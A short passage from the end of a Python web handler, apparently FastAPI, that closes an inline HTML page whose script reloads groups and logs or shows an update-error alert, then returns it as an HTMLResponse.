                    cargarGruposYLogs();
                } else {
                    alert("Error al actualizar");
                }
            }
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)
